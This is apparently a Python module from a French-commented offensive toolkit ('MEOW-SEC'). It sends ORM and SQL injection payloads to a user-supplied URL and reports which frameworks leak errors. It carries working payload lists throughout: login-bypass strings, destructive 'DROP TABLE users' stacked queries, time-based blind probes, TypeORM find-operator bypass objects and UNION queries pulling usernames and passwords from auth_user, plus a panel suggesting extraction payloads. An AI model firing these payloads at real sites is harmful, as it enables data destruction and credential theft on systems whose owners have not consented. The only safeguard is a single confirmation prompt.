# -*- coding: utf-8 -*-
"""MEOW-SEC :: ORMI — ORM Injection Tester
Cibles : Hibernate/HQL, JPQL, LINQ, Django ORM, Eloquent (Laravel), ActiveRecord (Rails)
"""
import os, re, json, time
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.ui import (console, show_module_banner, ok, err, info, warn, find,
                     ask_choice, G1, G2, CY, OR, RD, DM)
from core.cats import cat_talk, CAT_SCAN, CAT_FOUND
from rich.panel  import Panel
from rich.table  import Table
from rich.prompt import Prompt, Confirm
from rich.rule   import Rule
from rich        import box

try:
    import requests as _req
    _req.packages.urllib3.disable_warnings()
    HAS_REQUESTS = True
except Exception:
    HAS_REQUESTS = False

from core.proxy_manager import px as _px

_UA      = "MEOW-ORMI/1.0 (authorized-test)"
_TIMEOUT = 12

# ─── SIGNATURES D'ERREURS PAR ORM ────────────────────────────

_ORM_ERRORS = {
    "Hibernate/HQL": [
        "hqlexception", "querysyntaxexception", "org.hibernate",
        "unexpected token near", "expecting", "antlr", "hql:",
        "nhibernate", "could not resolve", "path expected for join",
        "org.hibernate.query", "hibernateexception",
        "unexpected end of subtree", "invalid path",
    ],
    "JPQL": [
        "javax.persistence", "jakarta.persistence", "jpqlexception",
        "persistenceexception", "eclipselink", "openjpa",
        "java.lang.illegalargumentexception", "jpql",
        "named query", "criteria query",
    ],
    "LINQ": [
        "system.linq", "linq to sql", "linqexception",
        "invalid column name", "system.data.linq",
        "entity framework", "dbentityvalidationexception",
        "sqlexception", "system.data.entity",
    ],
    "Django ORM": [
        "django.db", "operationalerror", "django.core.exceptions",
        "fielderror", "programmingerror at /",
        "psycopg2", "django.db.utils", "invalid field name",
    ],
    "Eloquent/Laravel": [
        "illuminate\\database", "queryexception", "laravel",
        "pdoexception", "illuminate\\", "syntax error or access violation",
        "pdo::prepare()", "bindparam",
    ],
    "ActiveRecord/Rails": [
        "activerecord", "actioncontroller", "rails",
        "pg::syntaxerror", "mysql2::error", "sqlite3::exception",
        "activerecord::statementinvalid", "undefined method",
    ],
    "Sequelize (Node)": [
        "sequelizedatabaseerror", "sequelize", "sequelizeuniqueconstrai",
        "unhandledpromiserejection", "sequelizeeagerloadingerror",
    ],
    "Mongoose": [
        "validatorerror", "casteerror", "mongoose", "mongoosetimeout",
        "document failed", "path `", "is required",
    ],
    "TypeORM": [
        # Classe d'erreur principale de TypeORM
        "queryfailederror",
        "typeormerror",
        "entitynotfounderror",
        # Noms de module dans les stack traces
        "typeorm", "queryrunner", "entitymanager",
        "entitymetadata", "columnmetadata",
        # Messages d'erreur spécifiques
        "could not find metadata for",
        "column was not found in",
        "entity with name",
        "repository for entity",
        "no entity column",
        # Drivers DB sous-jacents exposés via TypeORM
        "er_parse_error",          # MySQL/MariaDB via TypeORM
        "sqlite_error:",           # SQLite via TypeORM
        "relation does not exist", # PostgreSQL via TypeORM
        "invalid input syntax for",# PostgreSQL type error
    ],
    "Generic ORM": [
        "orm error", "query builder", "repository",
        "no such column", "unknown column", "ambiguous column",
        "column not found",
    ],
}

# ─── PAYLOADS DÉTECTION GÉNÉRIQUE ────────────────────────────

_DETECTION_PAYLOADS = [
    ("'",                       "Quote"),
    ("''",                      "Double quote escape"),
    ("1'",                      "Digit + quote"),
    ("1' OR '1'='1",            "Classic OR bypass"),
    ("1' OR '1'='1'--",         "Comment bypass"),
    ("' OR 1=1--",              "OR always true"),
    ("1 AND 1=1",               "AND true"),
    ("1 AND 1=2",               "AND false"),
    ("1' AND 1=1--",            "AND true quoted"),
    ("1' AND 1=2--",            "AND false quoted"),
    ("1); DROP TABLE users--",  "Stacked query"),
    ("admin'--",                "Admin bypass"),
    ("\\'",                     "Escaped quote"),
    ("%27",                     "URL-encoded quote"),
    ("' UNION SELECT null--",   "UNION null"),
]

# ─── PAYLOADS SPÉCIFIQUES AUX ORM ────────────────────────────

_HQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1",
    "' OR username IS NOT NULL OR username='",
    "') OR ('1'='1",
    "MEOW' OR 'x'='x",
    "' FROM User WHERE '1'='1",
    "' UNION SELECT user FROM User WHERE '1'='1",
]

_JPQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR TRUE OR '",
    "') OR (1=1) --",
    "' FROM User u WHERE '1'='1",
    "' UNION SELECT u FROM User u WHERE '1'='1",
]

_LINQ_PAYLOADS = [
    "' OR '1'='1",
    "1 OR 1=1",
    "' OR true--",
    "x' OR 1=1--",
    "\"; DROP TABLE Users;--",
]

_DJANGO_PAYLOADS = [
    "1 AND 1=1",
    "1 AND 1=2",
    "' OR ''='",
    "1; DROP TABLE users--",
    "%27 OR %271%27=%271",
    "1 UNION SELECT username,password FROM auth_user--",
]

_ELOQUENT_PAYLOADS = [
    "' OR '1'='1",
    "1' OR 1=1--",
    "' UNION SELECT * FROM users--",
    "' OR 1=1#",
    "1; DROP TABLE users--",
]

_ACTIVERECORD_PAYLOADS = [
    "1' OR '1'='1",
    "1 OR 1=1",
    "') OR ('1'='1",
    "1; DROP TABLE users--",
    "1 UNION SELECT NULL,NULL,NULL--",
]

_SEQUELIZE_PAYLOADS = [
    "1 OR 1=1",
    "'; DROP TABLE users;--",
    "1 UNION SELECT NULL--",
    "' OR true--",
    "1; SELECT * FROM users--",
]

# ─── PAYLOADS TYPEORM ─────────────────────────────────────────
# TypeORM est un ORM TypeScript/Node.js — les injections passent souvent
# par QueryBuilder (.where(string+input)), raw queries, ou orderBy(input).

_TYPEORM_QB_PAYLOADS = [
    # QueryBuilder WHERE string concat — le cas le plus fréquent
    "' OR '1'='1'-- -",
    "' OR 1=1-- -",
    "1' OR '1'='1",
    "1 OR 1=1-- -",
    "' OR true-- -",
    "1) OR (1=1-- -",
    "' UNION SELECT NULL,NULL-- -",
    "1'; SELECT pg_sleep(3);-- -",           # Blind time PostgreSQL
    "1 AND SLEEP(3)-- -",                    # Blind time MySQL
    "1; WAITFOR DELAY '0:0:3'-- -",          # Blind time MSSQL
    "1' AND 1=1-- -",
    "1' AND 1=2-- -",
]

# ORDER BY injection — TypeORM passe orderBy() directement au SQL
# si le dev utilise: .orderBy(req.query.sort)
_TYPEORM_ORDERBY_PAYLOADS = [
    "id ASC; DROP TABLE users--",
    "id ASC,(SELECT 1 FROM information_schema.tables LIMIT 1)--",
    "(CASE WHEN (1=1) THEN id ELSE name END)",
    "(SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)",
    "1;SELECT pg_sleep(3)--",
    "name ASC,(SELECT SLEEP(3))--",
    "id,(SELECT 1 WHERE 1=1)--",
    "FIELD(id,1,2,3)",                        # MySQL ORDER BY trick
]

# Find operator bypass — TypeORM FindOperator sérialisé
# Quand req.body.where est directement passé à find({ where: input })
_TYPEORM_FIND_BYPASS = [
    {"id":   "1 OR 1=1"},
    {"name": "' OR '1'='1"},
    {"id":   {"_type": "moreThan",        "_value": 0, "_useParameter": True, "_multipleParameters": False}},
    {"id":   {"_type": "lessThan",        "_value": 9999}},
    {"name": {"_type": "like",            "_value": "%"}},
    {"name": {"_type": "in",              "_value": []}},
    {"id":   {"_type": "not",             "_value": None}},
    {"name": {"_type": "raw",             "_value": "1=1"}},
    # Prisma-style bypass (parfois TypeORM compatible)
    {"id":   {"gt": 0}},
    {"id":   {"gte": 0, "lte": 999999}},
]

# ─── BOOLEAN BLIND (temps ou diff de réponse) ────────────────

_BOOL_PAIRS_ORM = [
    ("1' AND '1'='1'--", "1' AND '1'='2'--"),
    ("1 AND 1=1",        "1 AND 1=2"),
    ("' OR 1=1--",       "' OR 1=2--"),
    ("1' OR '1'='1",     "1' OR '1'='2"),
]

# ─── HELPERS HTTP ────────────────────────────────────────────

def _get(url, timeout=_TIMEOUT):
    try:
        return _req.get(url, verify=False, timeout=timeout,
                        allow_redirects=True, proxies=_px(),
                        headers={"User-Agent": _UA})
    except Exception:
        return None


def _post(url, data, timeout=_TIMEOUT):
    try:
        return _req.post(url, data=data, verify=False, timeout=timeout,
                         allow_redirects=True, proxies=_px(),
                         headers={"User-Agent": _UA})
    except Exception:
        return None


def _post_json(url, data, timeout=_TIMEOUT):
    try:
        return _req.post(url, json=data, verify=False, timeout=timeout,
                         allow_redirects=True, proxies=_px(),
                         headers={"User-Agent": _UA,
                                  "Content-Type": "application/json"})
    except Exception:
        return None


def _inject(url, param, payload):
    p  = urlparse(url)
    qs = parse_qs(p.query, keep_blank_values=True)
    qs[param] = [payload]
    return urlunparse(p._replace(query=urlencode(qs, doseq=True)))


def _check_orm_error(text):
    text_low = text.lower()
    for orm, sigs in _ORM_ERRORS.items():
        for sig in sigs:
            if sig in text_low:
                return orm, sig
    return None, None


# ─── TEST TECHNIQUES ─────────────────────────────────────────

def _test_error_detection(url, param, payloads, method="GET", post_data=None):
    """Détecte les erreurs ORM dans la réponse."""
    findings = []
    for payload, _ in (payloads if isinstance(payloads[0], tuple) else
                        [(p, f"payload_{i}") for i, p in enumerate(payloads)]):
        if method == "GET":
            r = _get(_inject(url, param, payload))
        else:
            d = dict(post_data or {}); d[param] = payload
            r = _post(url, d) if method == "POST" else _post_json(url, d)
        if not r:
            continue
        orm, sig = _check_orm_error(r.text)
        if orm:
            find(f"ORM injection [{RD}]{orm}[/] on [{CY}]{param}[/] — [{OR}]{sig}[/]")
            findings.append({
                "param": param, "type": "error-based",
                "orm": orm, "payload": payload,
                "evidence": sig, "severity": "HIGH"
            })
            return findings
    return findings


def _test_boolean_blind(url, param, baseline_len, method="GET", post_data=None):
    """Boolean blind via diff de longueur."""
    for true_p, false_p in _BOOL_PAIRS_ORM:
        lt = lf = 0
        for payload, is_true in [(true_p, True), (false_p, False)]:
            if method == "GET":
                r = _get(_inject(url, param, payload))
            else:
                d = dict(post_data or {}); d[param] = payload
                r = _post(url, d) if method == "POST" else _post_json(url, d)
            if not r:
                break
            if is_true:  lt = len(r.text)
            else:        lf = len(r.text)
        diff = abs(lt - lf)
        if diff > 80 and lt and lf:
            find(f"Boolean-blind ORM injection on [{CY}]{param}[/] — diff [{G1}]{diff}[/]")
            return [{
                "param": param, "type": "boolean-blind",
                "orm": "Unknown", "payload": f"{true_p} / {false_p}",
                "evidence": f"diff={diff}", "severity": "HIGH"
            }]
    return []


# ─── TYPEORM FIND OPERATOR BYPASS ────────────────────────────

def _test_typeorm_find_bypass(url, param):
    """
    Teste l'injection via TypeORM find({ where: userInput }).
    Le body JSON est envoyé tel quel — si le serveur passe
    directement req.body à find(), les FindOperators internes peuvent
    bypasser des contrôles d'accès ou provoquer des erreurs DB.
    """
    findings = []
    baseline_r = _get(url)
    baseline_len = len(baseline_r.text) if baseline_r else 0
    baseline_status = baseline_r.status_code if baseline_r else 0

    for payload_obj in _TYPEORM_FIND_BYPASS:
        # Envoi du payload comme body JSON (REST API typique)
        r = _post_json(url, {param: payload_obj})
        if not r:
            continue
        orm, sig = _check_orm_error(r.text)
        if orm == "TypeORM":
            find(f"TypeORM find() injection [{RD}]error[/] on [{CY}]{param}[/] — [{OR}]{sig}[/]")
            findings.append({
                "param": param, "type": "typeorm-find-operator",
                "orm": "TypeORM", "payload": str(payload_obj)[:60],
                "evidence": sig, "severity": "HIGH"
            })
            return findings
        # Bypass détecté si la réponse change significativement
        diff = abs(len(r.text) - baseline_len)
        if diff > 100 and r.status_code != baseline_status:
            find(f"TypeORM find() behavior change on [{CY}]{param}[/] — "
                 f"status {baseline_status}→{r.status_code}  diff={diff}")
            findings.append({
                "param": param, "type": "typeorm-find-operator",
                "orm": "TypeORM", "payload": str(payload_obj)[:60],
                "evidence": f"status {baseline_status}→{r.status_code} diff={diff}",
                "severity": "MEDIUM"
            })

    return findings


def _test_typeorm_orderby(url, param, method, post_data):
    """
    Teste l'injection ORDER BY — TypeORM expose souvent
    un paramètre de tri qui passe directement dans .orderBy(input).
    """
    findings = []
    for payload in _TYPEORM_ORDERBY_PAYLOADS:
        if method == "GET":
            r = _get(_inject(url, param, payload))
        else:
            d = dict(post_data or {}); d[param] = payload
            r = _post(url, d) if method == "POST" else _post_json(url, d)
        if not r:
            continue
        orm, sig = _check_orm_error(r.text)
        if orm:
            find(f"TypeORM ORDER BY injection [{RD}]{orm}[/] on [{CY}]{param}[/] — [{OR}]{sig}[/]")
            findings.append({
                "param": param, "type": "typeorm-orderby",
                "orm": orm, "payload": payload,
                "evidence": sig, "severity": "HIGH"
            })
            return findings
    return findings


# ─── SCAN PAR FRAMEWORK ──────────────────────────────────────

def _scan_framework(url, param, framework, method, post_data):
    """Lance les payloads spécifiques à un framework ORM."""
    payloads_map = {
        "Hibernate/HQL":     _HQL_PAYLOADS,
        "JPQL":              _JPQL_PAYLOADS,
        "LINQ":              _LINQ_PAYLOADS,
        "Django ORM":        _DJANGO_PAYLOADS,
        "Eloquent/Laravel":  _ELOQUENT_PAYLOADS,
        "ActiveRecord/Rails":_ACTIVERECORD_PAYLOADS,
        "Sequelize (Node)":  _SEQUELIZE_PAYLOADS,
        # TypeORM : QueryBuilder + raw query payloads
        "TypeORM":           _TYPEORM_QB_PAYLOADS,
        "Auto-detect":       [p for p, _ in _DETECTION_PAYLOADS],
    }
    payloads = payloads_map.get(framework, [p for p, _ in _DETECTION_PAYLOADS])

    findings = []
    for payload in payloads:
        if method == "GET":
            r = _get(_inject(url, param, payload))
        else:
            d = dict(post_data or {}); d[param] = payload
            r = _post(url, d) if method == "POST" else _post_json(url, d)
        if not r:
            continue
        orm, sig = _check_orm_error(r.text)
        if orm:
            find(f"ORM error [{RD}]{orm}[/] on [{CY}]{param}[/] → [{OR}]{sig}[/]  [{DM}]{payload[:40]}[/]")
            findings.append({
                "param": param, "type": "error-based",
                "orm": orm, "payload": payload,
                "evidence": sig, "severity": "HIGH"
            })
    return findings


# ─── SAVE ────────────────────────────────────────────────────

def _save(target, results):
    os.makedirs("data", exist_ok=True)
    slug = re.sub(r"[^a-zA-Z0-9_-]", "_", target)[:40]
    fname = f"data/ormi_{slug}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(fname, "w", encoding="utf-8") as f:
        json.dump({"target": target, "results": results,
                   "timestamp": datetime.now().isoformat()}, f, indent=2)
    ok(f"Results saved → [{CY}]{fname}[/]")


# ─── MAIN ────────────────────────────────────────────────────

_FRAMEWORKS = [
    "Auto-detect",
    "TypeORM",
    "Hibernate/HQL",
    "JPQL",
    "LINQ",
    "Django ORM",
    "Eloquent/Laravel",
    "ActiveRecord/Rails",
    "Sequelize (Node)",
]


def run():
    show_module_banner("ormi")
    cat_talk(CAT_SCAN, "ORM Injection — TypeORM, HQL, JPQL, LINQ, Django, Eloquent, ActiveRecord, Sequelize", RD)
    console.print()
    warn("AUTHORIZED USE ONLY — Unauthorized testing is illegal.")
    if not Confirm.ask(f"  [{OR}]◈ I confirm this is an authorized target[/]", default=False):
        info("Aborted."); return

    if not HAS_REQUESTS:
        err("requests library not available. Run: pip install requests"); return

    url = Prompt.ask(f"  [{G1}]◈ Target URL[/]").strip()
    if not url.startswith("http"):
        url = "https://" + url

    # Framework choice
    console.print()
    for i, fw in enumerate(_FRAMEWORKS, 1):
        color = CY if fw in ("Auto-detect", "TypeORM") else DM
        console.print(f"  [{G1}][{i}][/] [{color}]{fw}[/]")
    fw_choice = ask_choice("Framework ORM", "1")
    try:
        framework = _FRAMEWORKS[int(fw_choice) - 1]
    except (ValueError, IndexError):
        framework = "Auto-detect"

    # Method choice
    console.print(f"\n  [{G1}][1][/] GET parameters")
    console.print(f"  [{G1}][2][/] POST form")
    console.print(f"  [{G1}][3][/] POST JSON")
    method_choice = ask_choice("Method", "1")
    method = {"1": "GET", "2": "POST", "3": "JSON"}.get(method_choice, "GET")
    post_data = {}

    parsed = urlparse(url)
    params = list(parse_qs(parsed.query).keys())

    if method in ("POST", "JSON") or not params:
        param_str = Prompt.ask(f"  [{CY}]◈ Parameter name(s) (comma-sep)[/]", default="id").strip()
        params = [p.strip() for p in param_str.split(",")]
        if method in ("POST", "JSON"):
            for p in params:
                post_data[p] = Prompt.ask(f"  [{CY}]◈ Default value for '{p}'[/]", default="1").strip()

    info(f"Target [{CY}]{url}[/]  framework [{G1}]{framework}[/]  params {params}  method {method}")
    console.print()

    all_findings = []

    for param in params:
        console.print(Rule(f"[{G1}] ORM INJECTION :: {param} [{DM}]{framework}[/]", style=G2))

        bl_r = _get(url) if method == "GET" else _post(url, post_data)
        bl_len = len(bl_r.text) if bl_r else 0

        info(f"  Framework-specific payloads on [{CY}]{param}[/]...")
        findings = _scan_framework(url, param, framework, method, post_data)
        all_findings.extend(findings)
        if not findings:
            info(f"  [{DM}]No ORM error detected[/]")

        info(f"  Boolean-blind detection on [{CY}]{param}[/]...")
        findings = _test_boolean_blind(url, param, bl_len, method, post_data)
        all_findings.extend(findings)
        if not findings:
            info(f"  [{DM}]No boolean-blind difference[/]")

        # ── Tests supplémentaires TypeORM ──
        if framework in ("TypeORM", "Auto-detect"):
            info(f"  TypeORM ORDER BY injection on [{CY}]{param}[/]...")
            findings = _test_typeorm_orderby(url, param, method, post_data)
            all_findings.extend(findings)
            if not findings:
                info(f"  [{DM}]No ORDER BY injection[/]")

            info(f"  TypeORM find() operator bypass on [{CY}]{param}[/] (JSON)...")
            findings = _test_typeorm_find_bypass(url, param)
            all_findings.extend(findings)
            if not findings:
                info(f"  [{DM}]No find() operator bypass[/]")

    console.print()

    if all_findings:
        cat_talk(CAT_FOUND, f"{len(all_findings)} ORM injection finding(s)!", G1)
        t = Table(title=f"[{G1}]ORMI Results[/]", box=box.MINIMAL_DOUBLE_HEAD,
                  border_style=G2, header_style=CY)
        t.add_column("Param",    min_width=12)
        t.add_column("Type",     min_width=16)
        t.add_column("ORM",      min_width=20)
        t.add_column("Payload",  min_width=28)
        t.add_column("Evidence", min_width=20)
        for f in all_findings:
            t.add_row(f["param"], f"[{RD}]{f['type']}[/]", f["orm"],
                      f["payload"][:44], f["evidence"][:28])
        console.print(t)

        # Rappel des payloads d'extraction pour Hibernate
        if any(f["orm"] in ("Hibernate/HQL", "JPQL") for f in all_findings):
            console.print(Panel(
                f"[{CY}]HQL extraction:[/]  [{OR}]' FROM User WHERE '1'='1[/]\n"
                f"[{CY}]HQL users:[/]       [{OR}]' FROM User u WHERE u.username LIKE '%'[/]\n"
                f"[{CY}]JPQL extraction:[/] [{OR}]' FROM User u WHERE '1'='1[/]\n"
                f"[{CY}]Django raw:[/]      [{OR}]%27 UNION SELECT username,password FROM auth_user--[/]",
                title=f"[{RD}]⚡ ORM Extraction Payloads",
                border_style=RD
            ))
    else:
        ok("No ORM injection vulnerabilities detected.")

    _save(url, all_findings)
